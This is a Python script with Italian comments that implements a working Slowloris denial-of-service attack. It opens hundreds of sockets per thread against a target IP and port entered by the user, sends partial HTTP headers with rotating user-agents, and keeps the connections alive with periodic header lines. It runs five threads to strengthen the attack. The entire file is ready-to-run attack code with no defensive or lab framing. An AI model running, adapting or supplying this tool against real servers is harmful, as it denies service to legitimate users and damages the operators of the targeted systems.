import socket
import random
import time
import threading


def slowloris(target_ip, target_port, num_sockets=500):
    """
    Esegue un attacco Slowloris di base.
    
    L'attacco Slowloris tenta di mantenere connessioni HTTP parziali attive per esaurire le risorse del server di destinazione,
    impedendo che il server risponda correttamente ad altri client legittimi.

    Argomenti:
    target_ip -- L'indirizzo IP del server di destinazione
    target_port -- La porta del server di destinazione
    num_sockets -- Il numero di socket da aprire per l'attacco (default 500)
    """
    
    # Lista per memorizzare i socket attivi durante l'attacco
    sockets = []
    
    # Lista di user-agent per simulare richieste da vari browser e dispositivi
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.129 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.129 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/120.0.6099.119 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/120.0.6099.119 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPod; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/120.0.6099.119 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.1; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (X11; Linux i686; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (iPad; CPU OS 17_1_1 like Mac OS X; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (iPod touch; CPU iPhone OS 17_1_1 like Mac OS X; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.2210.144",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1_1) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.2210.144",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.2210.144",
        "Mozilla/5.0 (Windows NT 10.0; ARM64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.2210.144",
        "Mozilla/5.0 (Linux; Android 12; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36 EdgA/120.0.2210.144",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"
    ]

    print(f"[+] Attacco in corso su {target_ip}:{target_port} con {num_sockets} socket...")

    # Creazione dei socket iniziali
    for _ in range(num_sockets):
        try:
            # Creazione del socket TCP e connessione al server target
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            sockets.append(s)
            print(f"[+] Socket {_ + 1} creato.")

            # Invio della richiesta HTTP parziale con intestazioni
            user_agent = random.choice(user_agents)  # Selezione casuale di uno user-agent
            s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode('utf-8'))  # Messaggio GET parziale
            s.send(f"Host: {target_ip}\r\n".encode('utf-8'))  # Intestazione Host
            s.send(f"User-Agent: {user_agent}\r\n".encode('utf-8'))  # Intestazione User-Agent
            s.send("Content-Length: 42\r\n".encode('utf-8'))  # Definizione della lunghezza del contenuto
            s.send("Connection: keep-alive\r\n".encode('utf-8'))  # Connessione persistente
            print("[+] Intestazione inviata.")
        except socket.error as e:
            print(f"[-] Errore nella creazione del socket: {e}")
            break

    # Ciclo per mantenere i socket attivi
    while True:
        try:
            print(f"[+] Mantendo attivi {len(sockets)} socket...")
            # Per ogni socket attivo, invio un pacchetto per mantenerlo aperto
            for s in list(sockets):
                try:
                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode('utf-8'))  # Pacchetto casuale per mantenere la connessione
                except socket.error:
                    # Rimozione dei socket chiusi (con errore)
                    sockets.remove(s)
            
            # Se alcuni socket si sono chiusi, vengono riaperti
            for _ in range(num_sockets - len(sockets)):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Nuovo socket
                    s.connect((target_ip, target_port))
                    sockets.append(s)  # Aggiungi il socket riaperto alla lista
                    print("[+] Ricreazione del socket...")
                    user_agent = random.choice(user_agents)
                    s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode('utf-8'))
                    s.send(f"Host: {target_ip}\r\n".encode('utf-8'))
                    s.send(f"User-Agent: {user_agent}\r\n".encode('utf-8'))
                    s.send("Content-Length: 42\r\n".encode('utf-8'))
                    s.send("Connection: keep-alive\r\n".encode('utf-8'))
                except socket.error as e:
                    print(f"[-] Errore nel ricreare il socket: {e}")
                    break
            
            time.sleep(5)  # Invia pacchetti ogni 5 secondi per mantenere i socket attivi
        except KeyboardInterrupt:
            # Gestione dell'interruzione manuale dell'attacco
            print("[-] Attacco interrotto dall'utente.")
            break
        except socket.error as e:
            # Gestione degli errori legati ai socket
            print(f"[-] Errore nel mantenimento dei socket: {e}")
            break
        except Exception as e:
            # Gestione di errori generali
            print(f"[-] Si è verificato un errore imprevisto: {e}")
            break

    # Chiusura di tutti i socket dopo l'attacco
    print("[*] Chiusura di tutti i socket...")
    for s in sockets:
        s.close()


def thread_function(target_ip, target_port, num_sockets):
    """
    Funzione wrapper per l'esecuzione dell'attacco Slowloris in un thread separato.

    Questo permette di eseguire l'attacco in parallelo su più thread, aumentando la potenza dell'attacco.

    Argomenti:
    target_ip -- L'indirizzo IP del server di destinazione
    target_port -- La porta del server di destinazione
    num_sockets -- Il numero di socket da utilizzare nell'attacco
    """
    slowloris(target_ip, target_port, num_sockets)


if __name__ == "__main__":
    """
    Funzione principale che raccoglie input dall'utente e avvia l'attacco tramite thread.
    """
    # Raccogliere informazioni di connessione dall'utente
    target_ip = input("Inserisci l'indirizzo IP del target: ")
    target_port = int(input("Inserisci la porta del target (solitamente 80 o 443): "))

    # Lista per memorizzare i thread
    threads = []
    
    # Creazione e avvio di 5 thread per aumentare la potenza dell'attacco
    for i in range(5):
        thread = threading.Thread(target=thread_function, args=(target_ip, target_port, 500))
        thread.start()
        threads.append(thread)

    # Attendere che tutti i thread terminino l'esecuzione
    for thread in threads:
        thread.join()
